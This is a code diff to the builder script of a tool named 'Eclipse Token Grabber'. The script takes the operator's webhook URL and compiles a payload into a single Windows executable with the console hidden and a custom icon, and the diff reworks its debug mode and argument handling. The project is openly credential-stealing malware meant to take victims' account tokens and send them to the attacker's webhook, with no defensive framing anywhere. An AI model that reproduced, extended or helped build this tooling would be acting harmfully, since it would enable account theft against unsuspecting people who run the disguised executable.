@@ -50,14 +50,15 @@ def build(webhook: str, out_file: str, debug: bool):
 
     compile_command += [out_file + ".py", "--onefile", "--noconsole", "--hidden-import=_cffi_backend", f"--icon={path.join('img','exe_file.ico')}"]
 
-    if debug:
-        compile_command.pop(3)
-        
     try:
-        command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
-        result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
-        if "completed successfully" not in result:
-            raise Exception(result)  # result.splitlines()[-2]
+        if debug:
+            compile_command.remove("--noconsole")
+            run(args=compile_command)
+        else:
+            command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
+            result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
+            if "completed successfully" not in result:
+                raise Exception(result)  # result.splitlines()[-2]
     except Exception as error:
         exit(f"\n[-] Build Error: {error}")
 
@@ -72,7 +73,7 @@ def get_args() -> Namespace:
     parser = ArgumentParser(description='Eclipse Token Grabber Builder')
     parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
     parser.add_argument('-o', '--outfile', help='name your executable', default='', required=True)
-    parser.add_argument('-d', '--debug', help='enable debug mode', default='', required=False, action='store_true')
+    parser.add_argument('-d', '--debug', help='enable debug mode', nargs='?', const=True, default=False)
     return parser.parse_args()
 
 
